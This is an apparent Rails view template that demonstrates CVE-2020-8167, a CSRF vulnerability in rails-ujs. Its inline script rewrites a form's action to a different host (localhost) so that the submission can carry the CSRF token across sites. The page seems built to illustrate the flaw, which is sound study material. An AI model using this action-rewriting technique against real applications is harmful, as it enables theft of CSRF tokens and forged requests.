<h2><a href="https://groups.google.com/forum/#!topic/rubyonrails-security/x9DixQDG9a0">[[CVE-2020-8167] CSRF Vulnerability in rails-ujs</a></h2>

<%= form_with url: csrf_vulnerability_in_rails_ujs_path, model: @record do |f| %>
  <p>
    <%= button_tag 'change cross site host', type: 'button', class: '--js-change-cross-site-host' %>
  </p>
  <p>
    <%= f.label :name %>
    <%= f.text_field :name %>
  </p>
  <%= f.submit %>
<% end %>

<script type="text/javascript">
(() => {
  const changeCrossSiteHostTag = document.querySelector('.--js-change-cross-site-host');

  changeCrossSiteHostTag.addEventListener('click', function() {
    const formTag = this.form;
    const action = formTag.getAttribute('action');
    const crossSiteAction = 'http://localhost' + action;
    formTag.setAttribute('action', crossSiteAction);
  });
})();
</script>
